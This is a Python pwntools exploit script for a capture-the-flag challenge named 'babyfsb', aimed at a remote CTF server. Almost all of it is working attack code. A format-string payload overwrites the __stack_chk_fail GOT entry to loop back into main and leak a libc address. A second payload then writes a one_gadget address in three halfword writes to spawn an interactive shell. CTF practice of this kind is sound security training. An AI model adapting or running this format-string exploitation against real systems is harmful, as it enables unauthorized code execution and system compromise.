#!/usr/bin/python 
from pwn import *

#p = process("./babyfsb")
p = remote("ctf.j0n9hyun.xyz", 3032)
libc = ELF("./libc.so.6")
elf = ELF("./babyfsb")
main = 0x4006a6
main_low = main & 0xFFFF
stack_chk_fail_got = 0x601020

# libc leak, stack_chk_fail_got->main
pay = '%{}c'.format(main_low)
pay += '%8$hn' # 6 + (16/8) = 8
pay += '%15$p'
pay += p64(stack_chk_fail_got)
pay += 'A'*(0x40-len(pay))

#gdb.attach(p)

p.sendafter("\n", pay)
p.recvuntil("0x")
libc_start_main = int(p.recv(12), 16)
log.info("libc_start_main: "+hex(libc_start_main))
libcBase = libc_start_main - 0x20830
log.info("libcbBase : "+hex(libcBase))
one_gadget = libcBase + 0x45216
log.info("one_gadget : "+hex(one_gadget))

low = one_gadget & 0xFFFF
middle = (one_gadget >> 16) & 0xFFFF
high = (one_gadget >> 32) & 0xFFFF
#log.info("one_gadget_low : "+hex(low))
#log.info("one_gadget_middle : "+hex(middle))
#log.info("one_gadget_high : "+hex(high))

if middle > low: 
    m = middle - low
else: 
    m = 0x10000 + middle - low
if high > middle: 
    h = high - middle
else: 
    h = 0x10000 + high - middle

pay = '%{}c'.format(low)
pay += '%11$hn' # 6 + 40/8 = 11
pay += '%{}c'.format(m)
pay += '%12$hn'
pay += '%{}c'.format(h)
pay += '%13$hn'
pay += 'A'*(8 - len(pay)%8) #padding
#print len(pay)
pay += p64(stack_chk_fail_got)
pay += p64(stack_chk_fail_got+2)
pay += p64(stack_chk_fail_got+4)

p.sendafter("hello\n", pay)

p.interactive()

